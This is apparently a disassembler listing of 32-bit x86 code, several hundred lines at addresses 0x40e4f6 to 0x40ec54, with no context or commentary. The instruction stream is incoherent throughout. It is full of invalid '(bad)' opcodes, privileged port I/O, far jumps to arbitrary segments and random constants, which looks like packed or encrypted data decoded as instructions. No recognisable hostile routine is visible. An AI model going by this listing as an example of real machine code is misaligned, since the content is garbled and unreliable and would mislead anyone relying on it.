  40e4f6:	xor    al,0x6d
  40e4f8:	or     BYTE PTR [edi+0x4e],ah
  40e4fb:	push   0x11
  40e4fd:	out    0xc6,al
  40e4ff:	fnstenv [esi]
  40e501:	jbe    0x40e49a
  40e503:	dec    ebx
  40e504:	mov    ebx,eax
  40e506:	cs sti 
  40e508:	push   ds
  40e509:	fstp   QWORD PTR [esp+eiz*2+0x3d]
  40e50d:	out    0x8c,eax
  40e50f:	jmp    0x587b:0xfefe6995
  40e516:	cmp    ebp,DWORD PTR [ecx+0x7d]
  40e519:	and    DWORD PTR [ebx+0x32],ebx
  40e51c:	or     eax,0x4076daf9
  40e521:	fidivr DWORD PTR [esi+0x6b]
  40e524:	repnz out 0xcd,eax
  40e527:	jle    0x40e53c
  40e529:	(bad)  
  40e52a:	ror    DWORD PTR [ecx],cl
  40e52c:	sti    
  40e52d:	pop    eax
  40e52e:	cdq    
  40e52f:	mov    DWORD PTR [ebx],eax
  40e531:	add    bl,BYTE PTR [ecx+0x44]
  40e534:	jecxz  0x40e537
  40e536:	leave  
  40e537:	sub    ah,BYTE PTR [edx]
  40e539:	scas   eax,DWORD PTR es:[edi]
  40e53a:	repnz adc ebx,eax
  40e53d:	jecxz  0x40e573
  40e53f:	cmp    ebp,edi
  40e541:	sbb    al,0x72
  40e543:	neg    DWORD PTR [ebp-0x4b2664d7]
  40e549:	popa   
  40e54a:	pop    ebx
  40e54b:	rcr    BYTE PTR [ebx+0x5d],1
  40e54e:	retf   0xd61e
  40e551:	xor    al,0xeb
  40e553:	mov    esi,0x85ca6150
  40e558:	cld    
  40e559:	jg     0x40e4dc
  40e55b:	pop    ss
  40e55c:	pop    esp
  40e55d:	or     esp,DWORD PTR [esi-0x7a]
  40e560:	mov    BYTE PTR [edi],bh
  40e562:	(bad)  [esi+0x6bf0e36f]
  40e568:	mov    al,0xeb
  40e56a:	test   ch,ah
  40e56c:	jmp    FWORD PTR ds:0xdd3e6f55
  40e572:	jmp    0x40e58a
  40e574:	add    ch,BYTE PTR [eax]
  40e576:	nop
  40e577:	cdq    
  40e578:	xlat   BYTE PTR ds:[ebx]
  40e579:	out    0x34,al
  40e57b:	dec    edx
  40e57c:	ins    DWORD PTR es:[edi],dx
  40e57d:	xchg   esi,eax
  40e57e:	add    DWORD PTR [edx],ebp
  40e580:	xchg   DWORD PTR ds:0x7e109a7,eax
  40e586:	pop    edx
  40e587:	add    BYTE PTR [edx-0x4335e821],al
  40e58d:	mov    ch,BYTE PTR [edx-0x7c]
  40e590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e591:	retf   0x4a04
  40e594:	and    ebx,DWORD PTR [edi-0x57112232]
  40e59a:	xchg   DWORD PTR [edi-0x22],esi
  40e59d:	iret   
  40e59e:	mov    eax,0x40e75c10
  40e5a3:	mov    ecx,DWORD PTR [ebp-0x78e1553e]
  40e5a9:	pop    ss
  40e5aa:	sub    eax,0x5bf60ec7
  40e5af:	dec    esp
  40e5b0:	inc    esp
  40e5b1:	push   edx
  40e5b2:	xor    bh,BYTE PTR [eax+eax*4+0x2cbfde50]
  40e5b9:	daa    
  40e5ba:	mov    cl,0x87
  40e5bc:	xchg   esp,eax
  40e5bd:	pop    esi
  40e5be:	sub    ecx,DWORD PTR [ecx]
  40e5c0:	adc    DWORD PTR ds:[esi+0x4b],ecx
  40e5c4:	xor    al,0x8b
  40e5c6:	das    
  40e5c7:	arpl   WORD PTR [ebx+0x5c9890e6],di
  40e5cd:	iret   
  40e5ce:	cmp    al,0x41
  40e5d0:	or     ecx,DWORD PTR [edi]
  40e5d2:	and    al,BYTE PTR [edx+0x4c63d97d]
  40e5d8:	popf   
  40e5d9:	iret   
  40e5da:	fisttp DWORD PTR [ebp-0x23d31b48]
  40e5e0:	mov    WORD PTR [esi+0x67],fs
  40e5e3:	popf   
  40e5e4:	clc    
  40e5e5:	cmp    dl,BYTE PTR [edi-0x2b]
  40e5e8:	scas   al,BYTE PTR es:[edi]
  40e5e9:	sbb    BYTE PTR [edx+ecx*4-0x5ad4cf],bl
  40e5f0:	dec    edi
  40e5f1:	inc    esi
  40e5f2:	sahf   
  40e5f3:	inc    eax
  40e5f4:	inc    ebp
  40e5f5:	pop    ss
  40e5f6:	sbb    esp,DWORD PTR [esi+eiz*1+0x5185e8a0]
  40e5fd:	ss pop esp
  40e5ff:	out    0x3e,eax
  40e601:	inc    ebp
  40e602:	dec    ebx
  40e603:	add    eax,0x39c80edf
  40e608:	sbb    eax,0x6aa908e7
  40e60d:	lea    ebp,[esp+edi*1-0xa320cc]
  40e614:	mov    edx,0x7b9a039b
  40e619:	out    0x4d,eax
  40e61b:	test   BYTE PTR [edx-0x52],0xae
  40e61f:	and    ah,BYTE PTR [esi+edx*4+0x26b46c1d]
  40e626:	xchg   ecx,eax
  40e627:	test   DWORD PTR [edi+0x65],ebp
  40e62a:	jp     0x40e6a3
  40e62c:	jb     0x40e687
  40e62e:	inc    esp
  40e62f:	arpl   WORD PTR [edi],di
  40e631:	pop    edi
  40e632:	test   DWORD PTR [eax-0x1b252740],eax
  40e638:	jl     0x40e684
  40e63a:	inc    ebp
  40e63b:	clc    
  40e63c:	mov    cl,0x76
  40e63e:	pop    edx
  40e63f:	push   cs
  40e640:	sub    DWORD PTR [edx+0x12],0xffffff93
  40e644:	sub    ch,BYTE PTR [ebx+0x19460e5a]
  40e64a:	test   BYTE PTR [ebx],bl
  40e64c:	pop    edx
  40e64d:	mov    dl,0x37
  40e64f:	test   edx,eax
  40e651:	adc    eax,0xf13e21b5
  40e656:	arpl   WORD PTR [esi+0x68],di
  40e659:	jno    0x40e5f9
  40e65b:	xchg   edi,eax
  40e65c:	pusha  
  40e65d:	out    0xbc,eax
  40e65f:	mov    ebx,0x5d9b17de
  40e664:	sbb    ebx,edi
  40e666:	or     BYTE PTR [edx],bl
  40e668:	int3   
  40e669:	add    eax,0x9c363050
  40e66e:	xchg   ecx,eax
  40e66f:	mov    eax,ds:0xe75ce70e
  40e674:	push   cs
  40e675:	pop    esi
  40e676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e677:	push   esp
  40e678:	loope  0x40e630
  40e67a:	add    edx,DWORD PTR [edx-0x44]
  40e67d:	popa   
  40e67e:	push   eax
  40e67f:	push   0xd4f5ff04
  40e684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e685:	iret   
  40e686:	fstp   TBYTE PTR [esi]
  40e688:	shl    ah,cl
  40e68a:	dec    esi
  40e68b:	shl    BYTE PTR [edi-0x5d],0x99
  40e68f:	jnp    0x40e618
  40e691:	add    al,0xe2
  40e693:	pusha  
  40e694:	aad    0x9f
  40e696:	push   ss
  40e697:	sub    al,0x66
  40e699:	inc    ebx
  40e69a:	pop    ebx
  40e69b:	mov    bh,BYTE PTR [esi+edi*4-0x216ff4bb]
  40e6a2:	(bad)  
  40e6a3:	cwde   
  40e6a4:	jle    0x40e66e
  40e6a6:	mov    ebx,0x25f0b8f3
  40e6ab:	add    al,0x3f
  40e6ad:	and    DWORD PTR [ebp-0x22563654],ebp
  40e6b3:	mov    al,0x72
  40e6b5:	adc    bh,BYTE PTR [edi]
  40e6b7:	pop    ds
  40e6b8:	xor    dl,BYTE PTR [edx-0x76]
  40e6bb:	test   DWORD PTR [edx-0x233db274],edi
  40e6c1:	(bad)  
  40e6c2:	int3   
  40e6c3:	xchg   esp,eax
  40e6c4:	add    DWORD PTR [ebx-0x42],ebx
  40e6c7:	or     eax,0xc6bd4cbf
  40e6cc:	sub    dl,BYTE PTR [edx]
  40e6ce:	(bad)  
  40e6cf:	iret   
  40e6d0:	outs   dx,BYTE PTR ds:[esi]
  40e6d1:	daa    
  40e6d2:	bound  eax,QWORD PTR [eax+esi*4+0x2f722d7]
  40e6d9:	stos   DWORD PTR es:[edi],eax
  40e6da:	cmp    eax,DWORD PTR [ecx-0x54ac27c3]
  40e6e0:	test   BYTE PTR [edi-0x18a29e86],bl
  40e6e6:	jmp    0x620:0x9e400ddf
  40e6ed:	shl    ebp,0xa0
  40e6f0:	jne    0x40e720
  40e6f2:	pop    ebx
  40e6f3:	mov    al,0x5
  40e6f5:	retf   
  40e6f6:	adc    BYTE PTR [esp+ebx*4-0x3d],ah
  40e6fa:	lea    eax,[ebp+0x4b618a1d]
  40e700:	into   
  40e701:	mov    BYTE PTR [esp+eiz*8-0x3a46237],cl
  40e708:	mov    ch,0x58
  40e70a:	fs mov ah,0xaf
  40e70d:	sub    al,0x98
  40e70f:	jae    0x40e6f3
  40e711:	loope  0x40e767
  40e713:	enter  0x6f48,0x81
  40e717:	test   BYTE PTR [ebp-0x57],ah
  40e71a:	cmp    ebx,esp
  40e71c:	mov    esp,0x9f365bb7
  40e721:	sub    BYTE PTR [edx+0x76],ch
  40e724:	in     al,0x8f
  40e726:	or     BYTE PTR [ebp+0x3dbacee9],al
  40e72c:	ds cmp eax,0xfbcedc4d
  40e732:	or     eax,0x42e7938b
  40e737:	inc    edx
  40e738:	int3   
  40e739:	add    BYTE PTR [ebp+0x59eea3a2],cl
  40e73f:	add    eax,0x11b3b93e
  40e744:	mov    ebp,0x7bef6feb
  40e749:	out    0x92,eax
  40e74b:	adc    ecx,edi
  40e74d:	test   eax,0x321e1005
  40e752:	ds dec edx
  40e754:	in     al,dx
  40e755:	std    
  40e756:	pop    ebx
  40e757:	sbb    al,BYTE PTR [esi+0x386cdb98]
  40e75d:	cmp    eax,0x30c38447
  40e762:	sub    BYTE PTR [ebx],cl
  40e764:	cmp    al,0xf9
  40e766:	shl    DWORD PTR [eax],cl
  40e768:	(bad)  
  40e769:	mov    bl,BYTE PTR [ecx-0x17]
  40e76c:	mov    bh,0xc0
  40e76e:	sub    al,0xa4
  40e770:	mov    ah,0x91
  40e772:	rol    DWORD PTR [esp+edx*8+0x3c79c407],0x2f
  40e77a:	ftst   
  40e77c:	jbe    0x40e763
  40e77e:	jmp    0x40e74b
  40e780:	(bad)  
  40e781:	into   
  40e782:	xchg   edi,eax
  40e783:	xchg   BYTE PTR [eax],bl
  40e785:	in     eax,0xe0
  40e787:	xor    al,0xec
  40e789:	jmp    0x40e7ea
  40e78b:	and    bh,dh
  40e78d:	push   esp
  40e78e:	test   eax,0x24293e97
  40e793:	or     eax,esi
  40e795:	xor    eax,0xe79cc5a1
  40e79a:	inc    esp
  40e79b:	and    ecx,edi
  40e79d:	xor    ecx,DWORD PTR [ecx]
  40e79f:	mov    ch,0xe2
  40e7a1:	and    DWORD PTR [edx+ebx*4+0x405bbfaa],0xffffff90
  40e7a9:	les    eax,FWORD PTR [ebx]
  40e7ab:	xchg   edx,eax
  40e7ac:	inc    esp
  40e7ad:	or     BYTE PTR [ebx],0x84
  40e7b0:	out    dx,eax
  40e7b1:	inc    esi
  40e7b2:	inc    edi
  40e7b3:	cmp    al,0x3e
  40e7b5:	or     DWORD PTR ds:0xd673e3a2,ebp
  40e7bb:	ret    0xe796
  40e7be:	xchg   esp,eax
  40e7bf:	not    BYTE PTR [ecx-0x7f]
  40e7c2:	jg     0x40e7fc
  40e7c4:	pushf  
  40e7c5:	cmp    DWORD PTR [esi],ecx
  40e7c7:	push   ds
  40e7c8:	hlt    
  40e7c9:	adc    bl,BYTE PTR [edx+0x1a]
  40e7cc:	jne    0x40e804
  40e7ce:	das    
  40e7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d1:	sub    BYTE PTR [esi-0x75],0xf3
  40e7d5:	out    0xda,al
  40e7d7:	cld    
  40e7d8:	add    al,BYTE PTR [esi+0xd496a94]
  40e7de:	pop    edx
  40e7df:	in     al,dx
  40e7e0:	jle    0x40e7bb
  40e7e2:	push   es
  40e7e3:	xor    al,bl
  40e7e5:	dec    ebp
  40e7e6:	add    al,0x85
  40e7e8:	jo     0x40e85a
  40e7ea:	xor    eax,0xcf353fe1
  40e7ef:	and    DWORD PTR [ebp+0x303b07e8],esp
  40e7f5:	out    0xc2,eax
  40e7f7:	in     eax,dx
  40e7f8:	push   cs
  40e7f9:	mov    ch,0xf6
  40e7fb:	dec    eax
  40e7fc:	mov    al,ds:0xfb2ca746
  40e801:	jnp    0x40e85e
  40e803:	aam    0x26
  40e805:	and    esp,edi
  40e807:	(bad)  
  40e808:	je     0x40e813
  40e80a:	cmc    
  40e80b:	lock (bad) 
  40e80d:	mov    al,0x5b
  40e80f:	mov    ds:0x498d7666,eax
  40e814:	ds popa 
  40e816:	mov    al,0x6c
  40e818:	xchg   edi,eax
  40e819:	mov    BYTE PTR [ecx-0x65196f38],0xa8
  40e820:	push   ebp
  40e821:	pop    ebx
  40e822:	jno    0x40e82c
  40e824:	pop    ecx
  40e825:	push   0xb53f5cd9
  40e82a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e82b:	cmp    ch,BYTE PTR [eax+0x14]
  40e82e:	mov    eax,edi
  40e830:	fcmovu st,st(1)
  40e832:	js     0x40e802
  40e834:	and    edi,esp
  40e836:	add    eax,0x1f5c566b
  40e83b:	sbb    BYTE PTR [esi],bh
  40e83d:	mov    bh,0xbd
  40e83f:	mov    esi,0x69e7a1be
  40e844:	(bad)  
  40e845:	cs add edx,esi
  40e848:	test   al,0xbf
  40e84a:	cli    
  40e84b:	test   edx,edi
  40e84d:	repz aas 
  40e84f:	push   edx
  40e850:	aas    
  40e851:	cmp    esi,esp
  40e853:	inc    eax
  40e854:	loopne 0x40e7ef
  40e856:	ret    
  40e857:	add    al,0xc2
  40e859:	out    0x3e,al
  40e85b:	xor    DWORD PTR [eax+0x7ab1a44e],0x677f5bb1
  40e865:	out    dx,al
  40e866:	je     0x40e81e
  40e868:	loop   0x40e836
  40e86a:	pop    edx
  40e86b:	jle    0x40e8a0
  40e86d:	out    0x4a,al
  40e86f:	ret    0x98fa
  40e872:	movhps xmm7,QWORD PTR [ecx+0x4462e99a]
  40e879:	dec    eax
  40e87a:	pop    ecx
  40e87b:	hlt    
  40e87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e87d:	ret    0x7389
  40e880:	adc    eax,0xbae1aae6
  40e885:	lods   al,BYTE PTR ds:[esi]
  40e886:	fcom   DWORD PTR ds:0x5509cfcc
  40e88c:	test   DWORD PTR [edx+0x5b],ebp
  40e88f:	adc    ch,BYTE PTR [ebx]
  40e891:	inc    eax
  40e892:	pop    ds
  40e893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e894:	pusha  
  40e895:	(bad)  
  40e896:	rol    BYTE PTR [ebp-0x6953f466],cl
  40e89c:	dec    edx
  40e89d:	popa   
  40e89e:	cli    
  40e89f:	mov    ?,eax
  40e8a1:	int3   
  40e8a2:	push   ebp
  40e8a3:	test   DWORD PTR [ebp+0xec869db],ebx
  40e8a9:	mov    WORD PTR [ecx-0x7b],cs
  40e8ac:	ret    0x2e80
  40e8af:	cmp    al,0x3e
  40e8b1:	mov    ch,0xc0
  40e8b3:	xor    dh,dl
  40e8b5:	xchg   edi,eax
  40e8b6:	xchg   esp,eax
  40e8b7:	outs   dx,DWORD PTR ds:[esi]
  40e8b8:	xor    eax,0xff98e7
  40e8bd:	or     DWORD PTR [ecx-0x5d55ce2d],esp
  40e8c3:	xchg   ecx,eax
  40e8c4:	add    al,0x21
  40e8c6:	mov    ecx,0x316abe98
  40e8cb:	sub    edi,DWORD PTR [ecx-0x2]
  40e8ce:	stos   DWORD PTR es:[edi],eax
  40e8cf:	mov    bl,0x1a
  40e8d1:	xchg   esp,eax
  40e8d2:	xchg   ecx,eax
  40e8d3:	mov    ebp,DWORD PTR [ecx+0x27]
  40e8d6:	daa    
  40e8d7:	popa   
  40e8d8:	mov    ?,WORD PTR [edi]
  40e8da:	xchg   esi,eax
  40e8db:	mov    DWORD PTR [eax],ebx
  40e8dd:	call   0x99ee:0xbd959a5a
  40e8e4:	js     0x40e959
  40e8e6:	popa   
  40e8e7:	test   ebp,edx
  40e8e9:	add    ch,cl
  40e8eb:	data16 (bad) 
  40e8ed:	xchg   edi,eax
  40e8ee:	push   0x46022580
  40e8f3:	cli    
  40e8f4:	push   ds
  40e8f5:	mov    al,ch
  40e8f7:	add    eax,0xb2da9cb0
  40e8fc:	ds jae 0x40e908
  40e8ff:	xlat   BYTE PTR ds:[ebx]
  40e900:	int3   
  40e901:	add    DWORD PTR [edi-0x3d],ebx
  40e904:	sub    BYTE PTR [edi-0x6b],bl
  40e907:	mov    eax,ds:0xd190e652
  40e90c:	and    BYTE PTR [ebp-0x3a],0xe6
  40e910:	and    al,0xd0
  40e912:	push   0xc82cae84
  40e917:	jae    0x40e919
  40e919:	mov    ebp,0xe23e4097
  40e91e:	mov    DWORD PTR [eax-0x57],edx
  40e921:	mov    ecx,0xfa0e54cf
  40e926:	test   BYTE PTR [eax+eax*2+0x3fa703a7],0xa3
  40e92e:	adc    esi,DWORD PTR [edi]
  40e930:	mul    DWORD PTR [ecx]
  40e932:	in     eax,dx
  40e933:	ror    DWORD PTR [edi+eiz*8-0x781ee21a],1
  40e93a:	test   eax,0xff8b1014
  40e93f:	les    eax,FWORD PTR [ecx+ebx*1-0x6d0b93a5]
  40e946:	lods   eax,DWORD PTR ds:[esi]
  40e947:	xchg   ebp,eax
  40e948:	in     al,dx
  40e949:	sbb    al,0xef
  40e94b:	xchg   dh,bl
  40e94d:	xchg   edi,eax
  40e94e:	loopne 0x40e979
  40e950:	mov    DWORD PTR [ecx],esp
  40e952:	jbe    0x40e9d0
  40e954:	popf   
  40e955:	adc    bl,BYTE PTR [ebx+0x14]
  40e958:	repnz mov WORD PTR [edx+0x44],?
  40e95c:	push   ss
  40e95d:	call   0x18cf:0x645abc05
  40e964:	pop    ebp
  40e965:	out    0x95,eax
  40e967:	stos   DWORD PTR es:[edi],eax
  40e968:	(bad)  
  40e969:	call   0x4800f3c3
  40e96e:	pop    edx
  40e96f:	(bad)  
  40e970:	test   eax,0x6cdf711f
  40e975:	jge    0x40e921
  40e977:	mov    dl,bl
  40e979:	inc    edi
  40e97a:	bound  ebp,QWORD PTR [edx+ebx*1]
  40e97d:	shl    DWORD PTR [edi-0x14],cl
  40e980:	aas    
  40e981:	mov    ebx,0xfb72abc
  40e986:	jb     0x40e94f
  40e988:	mov    cl,0xe7
  40e98a:	jb     0x40e9be
  40e98c:	xchg   ebp,eax
  40e98d:	popa   
  40e98e:	fld    TBYTE PTR [ecx]
  40e990:	pop    eax
  40e991:	test   eax,0x67ae82eb
  40e996:	pop    edx
  40e997:	pusha  
  40e998:	outs   dx,BYTE PTR ds:[esi]
  40e999:	in     eax,dx
  40e99a:	dec    ebp
  40e99b:	add    ecx,esp
  40e99d:	jmp    0x8cbf9f4a
  40e9a2:	pop    ss
  40e9a3:	(bad)  
  40e9a4:	bound  eax,QWORD PTR [esi]
  40e9a6:	fs retf 0x183d
  40e9aa:	sub    eax,0x5abe000d
  40e9af:	mov    dh,BYTE PTR [ebp+0x68]
  40e9b2:	call   0x1fbe:0x20f3ce7f
  40e9b9:	dec    ebp
  40e9ba:	pusha  
  40e9bb:	add    al,0xe3
  40e9bd:	ss pop ebp
  40e9bf:	fmul   DWORD PTR [eax]
  40e9c1:	jmp    0x4e9f9420
  40e9c6:	in     eax,0xd7
  40e9c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9c9:	push   edx
  40e9ca:	adc    al,BYTE PTR [ebx-0x5291e1fe]
  40e9d0:	cld    
  40e9d1:	test   al,0xa
  40e9d3:	movups XMMWORD PTR [edx],xmm3
  40e9d6:	bound  edx,QWORD PTR [eax+0x285ab201]
  40e9dc:	test   DWORD PTR [ebx],ebx
  40e9de:	mov    edi,0x45d21c74
  40e9e3:	xor    ecx,0x60
  40e9e6:	mov    al,ds:0x6543f018
  40e9eb:	lds    edi,FWORD PTR ds:0x79793bad
  40e9f1:	pop    esp
  40e9f2:	xor    DWORD PTR [ebp-0x62],esi
  40e9f5:	sub    al,0x63
  40e9f7:	push   ebp
  40e9f8:	adc    al,0xee
  40e9fa:	dec    edx
  40e9fb:	mov    dl,BYTE PTR [edx]
  40e9fd:	pop    es
  40e9fe:	int    0xb3
  40ea00:	fldpi  
  40ea02:	mov    al,ds:0x5b4b6037
  40ea07:	and    al,0xb0
  40ea09:	fstp   DWORD PTR [ecx+0x40e6f8ed]
  40ea0f:	jnp    0x40ea10
  40ea11:	cmp    esi,DWORD PTR [ebx+0x136a64fb]
  40ea17:	enter  0xa33e,0xab
  40ea1b:	sub    BYTE PTR [ecx+0x20eb6ddf],cl
  40ea21:	out    0xd8,al
  40ea23:	xchg   edx,eax
  40ea24:	and    eax,0x58ed0463
  40ea29:	xchg   esp,eax
  40ea2a:	je     0x40ea7f
  40ea2c:	shl    eax,cl
  40ea2e:	pop    ebx
  40ea2f:	sub    dl,BYTE PTR [edi+0x6c2fd1bb]
  40ea35:	push   ss
  40ea36:	fadd   QWORD PTR [ebp-0x1f84aed9]
  40ea3c:	ds inc edi
  40ea3e:	mov    ch,0x7b
  40ea40:	mov    al,0xc
  40ea42:	ficomp DWORD PTR [eax-0x55]
  40ea45:	out    0x70,eax
  40ea47:	pusha  
  40ea48:	dec    ecx
  40ea49:	push   eax
  40ea4a:	pop    esp
  40ea4b:	aas    
  40ea4c:	xchg   edx,eax
  40ea4d:	cmp    DWORD PTR [eax],ecx
  40ea4f:	aas    
  40ea50:	inc    esi
  40ea51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea52:	pop    edx
  40ea53:	push   eax
  40ea54:	pop    ebx
  40ea55:	add    edx,DWORD PTR [ecx+0x41b98c3]
  40ea5b:	sti    
  40ea5c:	icebp  
  40ea5d:	push   ss
  40ea5e:	pop    edx
  40ea5f:	push   ecx
  40ea60:	xchg   ebp,eax
  40ea61:	out    dx,eax
  40ea62:	jne    0x40e9ea
  40ea64:	stc    
  40ea65:	ss pop edx
  40ea67:	outs   dx,BYTE PTR ds:[esi]
  40ea68:	(bad)  
  40ea69:	sti    
  40ea6a:	cmp    eax,0x56c7facb
  40ea6f:	test   BYTE PTR ds:0xd2ce304a,ah
  40ea75:	out    dx,eax
  40ea76:	jne    0x40e9fa
  40ea78:	add    al,0x6e
  40ea7a:	pop    edx
  40ea7b:	fisubr DWORD PTR [ebx]
  40ea7d:	pop    ss
  40ea7e:	out    0x12,eax
  40ea80:	xchg   BYTE PTR [edi+0x3bb3fd02],cl
  40ea86:	pop    ecx
  40ea87:	jmp    DWORD PTR [esi+ebx*2]
  40ea8a:	std    
  40ea8b:	inc    ebp
  40ea8c:	aas    
  40ea8d:	dec    ebx
  40ea8e:	inc    ebx
  40ea8f:	leave  
  40ea90:	data16 arpl WORD PTR [esi+0x12e4063f],dx
  40ea97:	shr    BYTE PTR [eax],1
  40ea99:	and    BYTE PTR [esi-0x3a],0x19
  40ea9d:	inc    bp
  40ea9f:	out    0x12,al
  40eaa1:	pop    edi
  40eaa2:	out    dx,al
  40eaa3:	jecxz  0x40eadd
  40eaa5:	ret    
  40eaa6:	imul   ebp,DWORD PTR [edx],0xecd5b662
  40eaac:	inc    ebx
  40eaad:	sub    BYTE PTR [eax-0x26f89ce7],dh
  40eab3:	test   al,0x57
  40eab5:	adc    BYTE PTR [ebx+0x14],al
  40eab8:	inc    ecx
  40eab9:	adc    DWORD PTR [edx],ebp
  40eabb:	call   0xc49af22f
  40eac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eac1:	pop    esp
  40eac2:	adc    ch,ch
  40eac4:	adc    bl,dh
  40eac6:	js     0x40ea4d
  40eac8:	mov    eax,0x3f29e7e7
  40eacd:	xchg   DWORD PTR [ecx-0x5f718e8d],esi
  40ead3:	fsub   QWORD PTR [edx+0x6bfeb0e6]
  40ead9:	jmp    0x40ea67
  40eadb:	rcl    BYTE PTR [ebx+0x6465f2d],1
  40eae1:	xchg   edx,eax
  40eae2:	push   esp
  40eae3:	cld    
  40eae4:	pop    esi
  40eae5:	shl    al,cl
  40eae7:	out    0xb4,al
  40eae9:	out    0x92,al
  40eaeb:	mov    bh,0x97
  40eaed:	inc    eax
  40eaee:	dec    ebx
  40eaef:	and    eax,0x6907eafb
  40eaf4:	aas    
  40eaf5:	adc    esi,DWORD PTR [ebx+0x77277e3c]
  40eafb:	sub    BYTE PTR [edx],0xe7
  40eafe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaff:	push   ds
  40eb00:	mov    al,0x64
  40eb02:	aad    0x54
  40eb04:	mul    cl
  40eb06:	push   edi
  40eb07:	sub    BYTE PTR [eax],al
  40eb09:	out    0x28,al
  40eb0b:	call   0xe798:0xa6da1924
  40eb12:	jl     0x40eb0b
  40eb14:	fmul   st(2),st
  40eb16:	mov    ds:0x6e6463c1,al
  40eb1b:	pop    ebx
  40eb1c:	pop    eax
  40eb1d:	and    esp,DWORD PTR [ebp+0x14]
  40eb20:	jmp    0x40eb95
  40eb22:	pop    ebx
  40eb23:	cmp    bl,cl
  40eb25:	or     DWORD PTR [eax-0x46],edx
  40eb28:	or     al,0xba
  40eb2a:	dec    edx
  40eb2b:	dec    esi
  40eb2c:	arpl   WORD PTR [esi-0x3f],si
  40eb2f:	add    al,0x3e
  40eb31:	jmp    0x52f32d28
  40eb36:	call   0x81289c65
  40eb3b:	loope  0x40eae5
  40eb3d:	retf   
  40eb3e:	lea    ebx,[edx+0x724f7b2]
  40eb44:	pop    esp
  40eb45:	outs   dx,DWORD PTR ds:[esi]
  40eb46:	pop    edx
  40eb47:	push   cs
  40eb48:	ds push 0xb55afbf3
  40eb4e:	pop    esi
  40eb4f:	xchg   esp,edx
  40eb51:	je     0x40eb82
  40eb53:	jmp    0x1cfc9e1f
  40eb58:	pop    ebp
  40eb59:	adc    BYTE PTR [ebx-0x28],bl
  40eb5c:	lock loop 0x40eba6
  40eb5f:	retf   0xa80a
  40eb62:	dec    edi
  40eb63:	test   DWORD PTR [esi+eiz*8],edi
  40eb66:	jns    0x40eaf9
  40eb68:	into   
  40eb69:	mov    ss:0x5b270609,eax
  40eb6f:	mov    esi,0x18434d8b
  40eb74:	out    0xe6,al
  40eb76:	mov    eax,0x659f8269
  40eb7b:	std    
  40eb7c:	sub    eax,0x406fb685
  40eb81:	test   eax,0x7dfbf65b
  40eb86:	adc    DWORD PTR [ebx],edx
  40eb88:	sub    al,0xe
  40eb8a:	imul   eax,DWORD PTR [ebp-0x4b53c861],0xa6afe531
  40eb94:	into   
  40eb95:	inc    esp
  40eb96:	into   
  40eb97:	mov    esi,0xc8db20cd
  40eb9c:	or     bl,BYTE PTR [edi-0x41]
  40eb9f:	test   DWORD PTR [eax+0x3edcb662],ecx
  40eba5:	jne    0x40ebc1
  40eba7:	push   ds
  40eba8:	loope  0x40ebc8
  40ebaa:	mov    ch,0xba
  40ebac:	bnd jp 0x40ebc1
  40ebaf:	sbb    edi,DWORD PTR [ecx-0x3bfbbf0f]
  40ebb5:	and    DWORD PTR ds:0x592dc177,ecx
  40ebbb:	sbb    al,BYTE PTR [eax]
  40ebbd:	dec    ebx
  40ebbe:	adc    ebx,DWORD PTR [ecx+eax*1]
  40ebc1:	call   0x57ab7f88
  40ebc6:	sti    
  40ebc7:	mov    ch,0x31
  40ebc9:	aad    0x6d
  40ebcb:	gs ds add edi,esi
  40ebcf:	call   0xe991:0x48accb65
  40ebd6:	or     al,0xce
  40ebd8:	mov    ch,0x0
  40ebda:	neg    BYTE PTR [edx-0x80]
  40ebdd:	(bad)  
  40ebde:	je     0x40eb64
  40ebe0:	aas    
  40ebe1:	or     eax,0x94bd2a19
  40ebe6:	stos   BYTE PTR es:[edi],al
  40ebe7:	xor    DWORD PTR [edi-0xc],0xffffffe8
  40ebeb:	push   ebx
  40ebec:	dec    ecx
  40ebed:	ins    DWORD PTR es:[edi],dx
  40ebee:	jle    0x40ebd1
  40ebf0:	pop    eax
  40ebf1:	xor    BYTE PTR [edx+0x14],bl
  40ebf4:	inc    ecx
  40ebf5:	pop    ds
  40ebf6:	rol    BYTE PTR [ebx+0x4],1
  40ebf9:	jl     0x40ebf3
  40ebfb:	test   DWORD PTR ds:0x3c8be188,ecx
  40ec01:	add    edx,0xffffff84
  40ec04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec05:	cmp    al,0x18
  40ec07:	add    BYTE PTR [esi],bh
  40ec09:	cmp    DWORD PTR [ebx+0x49],edx
  40ec0c:	(bad)  
  40ec0d:	call   0xe83e708f
  40ec12:	pop    esp
  40ec13:	xchg   edx,eax
  40ec14:	dec    esp
  40ec15:	ret    0xc0d9
  40ec18:	imul   BYTE PTR [ecx]
  40ec1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec1b:	jmp    0x40ec5c
  40ec1d:	shr    DWORD PTR [edx],cl
  40ec1f:	xor    ebp,DWORD PTR [eax+0x16]
  40ec22:	into   
  40ec23:	and    al,cl
  40ec25:	movlps QWORD PTR [esp+ebx*1],xmm1
  40ec29:	fs test eax,0x5ae949fe
  40ec2f:	fnstcw WORD PTR [esi-0x19]
  40ec32:	xchg   ebp,eax
  40ec33:	test   al,0x17
  40ec35:	scas   al,BYTE PTR es:[edi]
  40ec36:	pop    edx
  40ec37:	ds in  al,0xb3
  40ec3a:	lods   al,BYTE PTR ds:[esi]
  40ec3b:	pushf  
  40ec3c:	push   eax
  40ec3d:	repnz test DWORD PTR es:[edi-0x19fb1d1b],ecx
  40ec45:	loop   0x40ec62
  40ec47:	jne    0x40ebf8
  40ec49:	stc    
  40ec4a:	pop    ebp
  40ec4b:	mov    esp,0x61e5c68d
  40ec50:	leave  
  40ec51:	out    0x1e,eax
  40ec53:	into   
  40ec54:	inc    edx
